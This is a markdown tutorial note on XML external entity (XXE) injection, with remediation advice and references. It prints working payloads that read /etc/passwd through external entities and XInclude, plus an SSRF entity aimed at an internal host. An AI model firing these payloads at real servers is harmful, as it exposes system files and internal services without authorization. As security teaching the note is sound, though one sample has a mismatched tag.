# XXE (XML external entity)❌Injection

XXE injection allows an attacker to interfere with processing XML data of application.

Attacker can view internal file's of applicatgion server and interact with back end systems.

- ***XML (Extensible markup language):*** designed for storing and transporting data. XML uses a tree structure of tags and data.
- ***XML Entities*** is a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities &lt; and &gt; represent the characters < and >.
- ***DTD (Document type definition):*** define the structure of an XML document, it can contain types of data values and other items. 

  DTD is declared within the optional DOCTYPE element at the start of the XML document. 

  DTD can be fully self-contained within the document itself (known as an "internal DTD") or can be loaded from elsewhere (known as an "external DTD") or can be hybrid of the two. 
- ***What is XML external entities:*** a type of custom entity whose definition is located outside of the DTD.
  
  Declaration of an external entity uses the `SYSTEM` keyword and must specify a `URL` from which the value of the entity should be loaded
  
  ` <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>` or `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>`

## How XXE vulnerability occur?

When aplications use the XML format to transmit data between the browser to server. they always using standard library or platform API to process XML data on the server.

XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.

Like XXE are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. also external entities are allow an entity to be defined based on the contents of a file path or URL. 

## Types of XXE

- Internal DTD
- External DTD


## 🔎 How to find and test XXE
### 1. Exploiting XXE to retrieve files

 To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:

   1. Edit a DOCTYPE element that defines an external entity containing the path to the file.
   2. Edit a data value in the XML that is returned in the application's response, to make use of the defined external entity.

Example: Application checks for the stock level of a product by submitting the following XML to the server
```
<?xml version="1.0" encoding="UTF-8"?>
<stocCheck><productId>381</productId></stockCheck>
```

Here. no defenses against XXE attacks, so you can exploit XXE to retrieve the `/etc/passwd` file by submitting following XXE payload: 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
This XXE payload defines an external entity &xxe; whose value is the contents of the /etc/passwd file and uses the entity within the productId value. This causes the application's response to include the contents of the file.
```
Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```
### 2. Exploiting XXE to perform SSRF attacks

SSRF is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.

Example: Perform SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```
### 3. [Blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)

### 4. Finding hidden attack surface for XXE injection
  1. XInclude attacks

Perform an XInclude attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. 

Example:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> 
```
  2. [XXE attacks via file upload](https://portswigger.net/web-security/xxe)
  3. [XXE attacks via modified content type](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks)


## 🛠️ Remediation of XXE

- XML parsing library supports potentially dangerous XML features that the application does not need or intend to use. The safest way to prevent XXE is always to disable DTDs (External Entities) completely. 
-  Configure XML parser to disable external entity resolution.
-  Disable support for XInclude

## 🔗 Refrence

- https://portswigger.net/web-security/xxe
- https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
